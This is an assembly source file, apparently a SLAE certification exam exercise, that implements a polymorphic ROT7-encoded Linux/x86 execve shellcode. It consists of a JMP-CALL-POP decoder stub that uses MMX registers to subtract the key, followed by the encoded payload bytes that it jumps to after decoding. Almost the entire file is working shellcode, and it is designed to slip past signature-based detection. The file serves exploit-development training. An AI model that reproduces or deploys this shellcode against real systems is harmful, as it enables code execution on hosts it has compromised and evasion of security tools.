; Filename: poly_rot7_execve.nasm
; Author: Ray Doyle
; Website: https://www.doyler.net
;
; Purpose: SLAE Exam Assignment #6 - Polymorphic ROT7 encoded execve shellcode (Linux/x86) - 72 bytes (2 less than original)
; Original Shellcode: http://shell-storm.org/shellcode/files/shellcode-900.php

global _start

section .text

_start:
   jmp call_decoder

decoder:
   ; JMP-CALL-POP to get the decoder string into ESI
   pop esi

   ; New, load the "Shellcode" bytes into EDI
   lea edi, [esi +8]

   xor ecx, ecx
   ;mov cl, 0x1e  ; ROTed shellcode length

   ; Shellcode length is now divided by 4 since 8 operations are performed at once
   mov cl, 0x8

decode:
   ;cmp byte [esi], 0x7
   ;jl lowbound
   ;sub byte [esi], 0x7
   ;jmp common_commands

   ; Replaced the decode -> common_commands loop
   ; This now uses the MMX registers, and performs 8 operations at once
   ; Note that the lower bounds are not currently checked at all
   ; The example shellcode did not have any wraparound, so this will work fine as an example

   ; Load the shellcode into mm0
   movq mm0, qword [edi]

   ; Load the decoder bytes into mm1
   movq mm1, qword [esi]

   ; Subtract mm1 from mm0 (no wraparound detection)
   psubq mm0, mm1

   ; Update the shellcode with the decoded bytes
   movq qword [edi], mm0

   ; Move to the next 8 bytes of the encoded shellcode
   add edi, 0x8

   ; Loop back to decode the rest of the shellcode
   loop decode

   ; Execute the shellcode once the decode loop is complete
   jmp short Shellcode

;lowbound:
;   xor ebx, ebx
;   xor edx, edx
;   mov bl, 0x7
;   mov dl, 0xff
;   inc dx
;   sub bl, [esi]
;   sub dx, bx
;   mov [esi], dl
;
;common_commands:
;   inc esi
;   loop decode
;   jmp Shellcode

call_decoder:
   call decoder
   decoder_value db 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07
   Shellcode db 0x38,0xc7,0x57,0x6f,0x69,0x68,0x7a,0x6f,0x6f,0x69,0x70,0x75,0x36,0x6f,0x36,0x36,0x36,0x36,0x90,0xea,0x57,0x90,0xe9,0x5a,0x90,0xe8,0xb7,0x12,0xd4,0x87